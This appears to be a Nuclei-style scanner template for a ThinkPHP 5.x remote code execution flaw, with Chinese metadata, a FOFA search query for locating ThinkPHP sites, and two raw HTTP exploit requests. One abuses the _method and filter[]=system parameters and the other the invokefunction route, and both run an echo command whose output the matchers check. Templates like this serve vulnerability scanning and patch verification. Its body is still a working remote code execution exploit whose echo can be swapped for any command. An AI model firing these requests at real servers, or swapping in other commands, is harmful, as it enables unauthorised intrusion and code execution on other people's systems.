id: thinkphp-rce

info:
  name: ThinkPHP 远程代码执行漏洞
  author: god
  severity: critical
  description: ThinkPHP 5.x 框架 _method 参数覆盖导致远程代码执行
  metadata:
    fofa-query: app="ThinkPHP"
  tags: thinkphp,rce,php

http:
- raw:
  - |
    @timeout: 30s
    POST /index.php?s=captcha HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo thinkphp_rce_test

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - "thinkphp_rce_test"
      condition: and

- raw:
  - |
    @timeout: 30s
    GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo+thinkphp_test2 HTTP/1.1
    Host: {{Hostname}}

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - "thinkphp_test2"
      condition: and
